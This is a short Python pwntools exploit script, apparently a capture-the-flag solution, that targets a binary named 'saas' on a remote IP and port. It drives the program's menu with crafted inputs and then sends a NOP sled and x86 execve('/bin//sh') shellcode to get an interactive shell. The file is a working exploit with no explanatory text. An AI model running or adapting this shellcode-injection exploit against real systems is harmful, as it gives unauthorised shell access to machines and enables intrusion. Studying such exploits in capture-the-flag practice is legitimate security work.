#!/usr/bin/env python3

from pwngun_craft import craft
from pwn import *

# SETTINGS

BINARY = "./saas"

IP = "151.236.114.211"
PORT = 17173

LINK_LIBC = False
LIBC = ""
LD = ""
GDBSCRIPT = """
b *run_shellcode+339
"""

LOG_LEVEL = "DEBUG"

r, elf, libc = craft(LINK_LIBC, BINARY, LIBC, LD, GDBSCRIPT, IP, PORT, LOG_LEVEL)

# SPLOIT #
r.recvuntil(b"> ")
r.sendline(b"1")
r.recvuntil(b": ")
r.send(b"YZ1PPQ")
r.recvuntil(b"> ")
r.sendline(b"1")
r.recvuntil(b": ")
r.send(b"RYXXqJ")
r.recvuntil(b"> ")
r.sendline(b"4")
r.recvuntil(b": ")
r.sendline(b"0")
r.recvuntil(b": ")
r.sendline(b"2160974641")
r.recvuntil(b"> ")
r.sendline(b"4")
r.recvuntil(b": ")
r.sendline(b"1")
r.recvuntil(b": ")
r.sendline(b"3")
r.send(b"\x90" * 0x55 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")

r.interactive()
